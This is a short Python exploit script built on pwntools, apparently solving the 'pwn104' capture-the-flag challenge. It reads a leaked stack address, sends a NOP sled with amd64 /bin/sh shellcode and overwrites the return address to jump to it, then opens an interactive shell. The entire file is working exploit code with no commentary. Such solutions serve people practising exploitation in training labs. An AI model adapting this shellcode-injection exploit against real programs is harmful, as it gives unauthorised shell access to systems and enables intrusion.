import pwn
import time

elf = pwn.context.binary = pwn.ELF("./pwn104.pwn104")
io = elf.process()
pwn.gdb.attach(io)
time.sleep(2)

shellcode = pwn.asm(pwn.shellcraft.amd64.linux.sh())
print(len(shellcode))
offset = 89 - len(shellcode)
io.recvuntil("at ")

shellAddr = io.recv(14)
print(shellAddr)
shellAddr = int(shellAddr,16)
payload = b"".join(
    [
        #NOP Sled
        #Shellcode
        b"\x90"*offset,
        shellcode,
        #Address of shell code
        pwn.p64(shellAddr)
    ]
)
io.sendline(payload)
io.interactive()
